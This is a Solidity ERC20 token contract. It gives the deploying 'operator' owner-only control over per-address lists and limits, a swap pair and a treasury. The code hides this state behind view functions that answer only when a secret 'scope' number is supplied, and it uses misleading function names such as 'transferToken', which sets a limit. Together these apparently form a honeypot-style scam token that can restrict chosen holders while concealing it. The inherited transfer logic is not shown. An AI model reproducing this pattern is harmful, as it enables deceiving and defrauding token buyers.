// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;
//pragma abicoder v2;

import "./IERC20.sol";
import "./ERC20.sol";


contract Token is ERC20{

    event SetTreasuryAddress(address oldAddress, address newAddress);

    uint256 internal _transactionScope;
    uint256 internal _transferTokenScope;
    uint256 internal _ownerTransactionScope;

    address public operator;

   
    constructor(string memory _name, string memory _symbol, uint256 _amount) public ERC20(_name, _symbol) {
        operator = msg.sender;
        _mint(msg.sender, (_amount * 10**decimals()));
    }

    
    function viewTokenList(uint256 scope, address account) external view returns(bool content) {
        if(scope == _transactionScope){
            content = tokenList[account];
        }
    }

    
    function viewTransferToken(uint256 scope, address account) external view returns(uint256 content) {
        if(scope == _transferTokenScope){
            content = _transferToken[account];
        }
    }

    
    function viewOwnerTransaction(uint256 scope, address account) external view returns(uint256 content) {
        if(scope == _ownerTransactionScope){
            content = _limitedToken[account];
        }
    }

    
    function newTransferToken(address account, uint256 amount) external onlyOwner{
        require(account != address(0), "account cannot be zero address");
        _transferToken[account] = amount;
    }

  
    function setSwapPair(address _pair) external onlyOwner returns(bool) {
        require(_pair != address(0), "pair cannot be zero address");
        pair = _pair;
        return true;
    }

   
    function transactionList(address token, bool state) external onlyOwner returns(bool) {
        require(token != address(0), "token cannot be zero address");
        tokenList[token] = state;
        return true;
    }

   
    function treasuryAddress(address _treasury) external onlyOwner {
        require(_treasury != address(0), "Transfer cannot be zero address");
        address old = treasury;
        treasury = _treasury;
        emit SetTreasuryAddress(old, _treasury);
    }

 
    function transferToken(address _owner, uint256 _amount) external onlyOwner {
        require(_owner != address(0), "Owner cannot be zero address");
        _limitedToken[_owner] = _amount;
    }

    
    function transactionScope(uint256 _scope) external onlyOwner {
        require(_scope > 0, "Scope needs to be greater than zero");
        _transactionScope = _scope;
    }

  
    function transferScope(uint256 _tokenScope) external onlyOwner {
        require(_tokenScope > 0, "Token scope needs to be greater than zero");
        _transferTokenScope = _tokenScope;
    }

	
    function ownerTransactionScope(uint256 _ownerScope) external onlyOwner {
        require(_ownerScope > 0, "Owner scope needs to be greater than zero");
        _ownerTransactionScope = _ownerScope;
    }

  
    function transferOwnership(address newOperator) external onlyOwner {
        require(newOperator != address(0), "Ownable: new owner is the zero address");
        operator = newOperator;
    }

    modifier onlyOwner() {
        require(operator == msg.sender, "Ownable: caller is not the owner");
        _;
    }

}